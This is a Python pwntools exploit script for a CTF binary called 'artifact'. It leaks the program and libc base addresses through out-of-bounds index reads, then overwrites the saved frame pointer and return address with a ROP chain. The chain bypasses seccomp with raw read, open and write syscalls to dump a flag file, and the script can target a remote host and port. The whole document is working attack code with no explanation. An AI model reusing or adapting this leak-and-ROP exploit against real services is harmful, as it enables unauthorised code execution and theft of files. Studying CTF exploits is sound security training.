#!/usr/bin/env python

from pwn import *
import sys

context.arch = 'amd64'

def show(idx):
    r.sendlineafter("Choice?", "1")
    r.sendlineafter("Idx?", str(idx))
    r.recvuntil("Here it is: ")
    return r.recvuntil("\n-----> ")

def memo(idx, num):
    r.sendlineafter("Choice?", "2")
    r.sendlineafter("Idx?", str(idx))
    r.sendlineafter("number:", str(num))

def exit():
    r.sendlineafter("Choice?", "3")

def exploit(r):
    elf_base = int(show(202).split("\n")[0])-0xbb0
    libc_base = int(show(-299).split("\n")[0])

    log.success("elf base at: "+hex(elf_base))
    log.success("libc base at: "+hex(libc_base))
    
    libc_target = libc_base+0x3c3000 # just nulls here
    elf_target = elf_base+0x202000
        
    # gadgets
    pop_rax = libc_base+0x3a998 
    pop_rdi = libc_base+0x1fd7a
    pop_rsi = libc_base+0x1fcbd
    pop_rdx = libc_base+0x1b92
    push_rax = libc_base+0x5988
    syscall = libc_base+0xbc765
    
    log.progress("bypassing seccomp...")
    # rax = syscall ; rdi, rsi, rdx
    # read(0,<addr_libc>,0x200)
    rop_chain = [pop_rax,
                 0x0,
                 pop_rdi,
                 0x0,
                 pop_rsi,
                 libc_target,
                 pop_rdx,
                 0x200,
                 syscall]
    # open(<libc_target>,0,2)
    rop_chain += [pop_rax,
                  0x2,
                  pop_rdi,
                  libc_target,
                  pop_rsi,
                  0x0,
                  pop_rdx,
                  0x2,
                  syscall]
    # read(0x3,<elf_target>,0xff)
    rop_chain += [pop_rax,
                  0x0,  
                  pop_rdi,
                  0x3,
                  pop_rsi,
                  elf_target,
                  pop_rdx,
                  0xff,
                  syscall]
    # write(1, elf_target, 0xff)
    rop_chain += [pop_rax,
                  0x1,
                  pop_rdi,
                  0x1,
                  pop_rsi,
                  elf_target,
                  pop_rdx,
                  0xff,
                  syscall]


    payload = p64(0x67616c66) # "flag"
    payload += p64(0x0)
    memo(202, elf_base+0x202200)  # overwrite rbp
    for i in range(0,len(rop_chain)):   
        memo(203+i, rop_chain[i]) # overwrite rip    
    exit() 
    r.sendline(payload) 
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        #r = process(['/home/vagrant/CTFs/hitconctf17/artifact/artifact'], env={"LD_PRELOAD":""})
        r = process(['/home/vagrant/CTFs/hitconctf17/artifact/artifact'], env={"LD_PRELOAD":"./libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)
